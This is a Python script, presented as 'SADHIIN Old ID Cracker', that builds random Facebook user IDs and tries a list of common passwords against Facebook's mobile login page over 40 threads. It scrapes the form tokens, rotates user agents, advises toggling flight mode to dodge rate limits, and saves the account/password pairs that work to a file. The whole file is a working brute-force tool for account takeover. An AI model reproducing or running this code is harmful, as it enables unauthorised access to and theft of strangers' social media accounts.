# SADHIIN.py - Old ID Auto Crack 2010-2020 (No File Needed)
# Coded by SADHIIN

import os, random, requests, re, time
from concurrent.futures import ThreadPoolExecutor as tp

oks = []
cps = []
loop = 0

def logo():
    os.system('clear')
    print('''
\033[1;96m   ███████  █████  ██████  ██   ██ ██ ██ ███    ██ 
\033[1;97m   ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
\033[1;96m   ███████ ███████ ██████  ███████ ██ ██ ██  ██ 
\033[1;97m        ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
\033[1;96m   ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ 
          
      \033[1;97mSADHIIN OLD ID CRACKER
    \033[1;96m2010-2020 AUTO UID + PASS CRACK
        \033[1;97mCREATED BY SADHIIN
\033[1;92m─────────────────────────────────────────────''')

def old_crack():
    logo()
    try:
        limit = int(input('\033[1;97mHow Many IDs Crack → \033[1;96m'))
    except:
        limit = 5000
    
    print(f'\n\033[1;92mCracking {limit} Old IDs (2010-2020 Range)...')
    print('\033[1;93mUse Flight Mode Every 3-5K → Best Result\n')
    
    global loop
    loop = 0
    
    with tp(max_workers=40) as sadhin:
        for _ in range(limit):
            # 2010-2020 এর পুরাতন রেঞ্জ
            uid = random.choice([
                f"10000{random.randint(10000000,99999999)}",     # 2010-2014
                f"1000{random.randint(100000000,999999999)}",     # 2014-2017
                f"10000{random.randint(100000000,999999999)}"     # 2017-2020
            ])
            pwx = [
                "123456","12345678","123456789","786786","57273200",
                "102030","112233","123123","000000","786000",
                "pakistan","bangladesh","india123","malaysia","indonesia",
                "1990","1991","1992","1993","1994","1995","1996","1997","1998","1999",
                "2000","2001","2002","2003","2004","2005"
            ]
            sadhin.submit(cracker, uid, pwx)
    
    print(f'\n\033[1;92mCracking Finished!')
    print(f'\033[1;92mTotal OK → {len(oks)} | CP → SADHIIN_OK.txt')
    input('\nPress Enter to Back → ')
    old_crack()

def cracker(uid, pwx):
    global loop, oks, cps
    loop += 1
    sys.stdout.write(f'\r\033[1;97m[SADHIIN] {loop} → OK:{len(oks)} CP:{len(cps)} ')
    sys.stdout.flush()
    
    for pw in pwx:
        try:
            ua = random.choice([
                "Mozilla/5.0 (Linux; Android 5.1.1; SM-J200G Build/LMY47X) AppleWebKit/537.36",
                "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M) AppleWebKit/537.36",
                "Mozilla/5.0 (Linux; Android 7.0; SM-G610F Build/NRD90M) AppleWebKit/537.36"
            ])
            ses = requests.Session()
            head = {"User-Agent": ua}
            r = ses.get("https://mbasic.facebook.com", headers=head).text
            
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', r).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', r).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', r).group(1),
                "li": re.search('name="li" value="(.*?)"', r).group(1),
                "email": uid,
                "pass": pw,
                "login": "Log In"
            }
            res = ses.post("https://mbasic.facebook.com/login.php", data=data, headers=head, allow_redirects=False, timeout=10)
            
            if "c_user" in ses.cookies.get_dict():
                print(f'\r\033[1;92m[SADHIIN-OK] {uid} | {pw}')
                open("SADHIIN_OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "checkpoint" in str(res.text):
                print(f'\r\033[1;93m[SADHIIN-CP] {uid} | {pw}')
                cps.append(uid)
                break
        except:
            pass

logo()
old_crack()
